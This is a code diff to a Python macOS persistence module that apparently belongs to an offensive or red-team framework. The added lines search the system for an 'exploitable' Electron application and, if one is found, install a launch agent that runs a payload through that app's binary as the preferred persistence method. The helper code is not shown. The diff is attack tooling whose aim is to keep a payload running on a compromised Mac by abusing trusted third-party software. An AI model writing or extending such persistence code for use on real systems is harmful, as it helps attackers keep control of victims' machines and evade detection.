@@ -5,6 +5,7 @@ macos.py: macOS-specific persistence logic.
 import platform
 
 from support.core import Persistence
+from support.macos_utilities.electron import SearchElectron
 from support.macos_utilities.launch_service import LaunchService
 from support.macos_utilities.persistence_methods import MacPersistenceMethods
 
@@ -32,6 +33,9 @@ class MacPersistence(Persistence):
         self.recommended_method
 
         self.xnu_version = self._get_xnu_version()
+        self.vulnerable_electron_app = SearchElectron().find_first_exploitable_application()
+
+        super().__post_init__()
 
 
     def _get_xnu_version(self) -> int:
@@ -45,6 +49,9 @@ class MacPersistence(Persistence):
         """
         Determine the recommended persistence method for macOS.
         """
+        if self.vulnerable_electron_app:
+            return MacPersistenceMethods.LAUNCH_AGENT_ELECTRON.value
+
         # If we lack root access, we can only use user-level persistence methods.
         if self.identifier != 0:
             return MacPersistenceMethods.LAUNCH_AGENT_USER.value
@@ -67,6 +74,9 @@ class MacPersistence(Persistence):
         if self.identifier != 0 or not py_sip_xnu or py_sip_xnu.SipXnu().sip_object.can_edit_root is False:
             methods.remove(MacPersistenceMethods.LAUNCH_DAEMON_SYSTEM.value)
             methods.remove(MacPersistenceMethods.LAUNCH_AGENT_SYSTEM.value)
+
+        if not self.vulnerable_electron_app:
+            methods.remove(MacPersistenceMethods.LAUNCH_AGENT_ELECTRON.value)
 
         return methods
 
@@ -91,5 +101,12 @@ class MacPersistence(Persistence):
         ]:
             LaunchService(self.payload).install_root_launch_service(method)
             return
+
+        if method == MacPersistenceMethods.LAUNCH_AGENT_ELECTRON.value:
+            for application in (self.vulnerable_electron_app / "Contents" / "MacOS").glob("*"):
+                if application.is_dir():
+                    continue
+                LaunchService(self.payload).install_electron_launch_service(variant=method, electron_binary=application)
+                return
 
         raise NotImplementedError(f"Method {method} not implemented.")
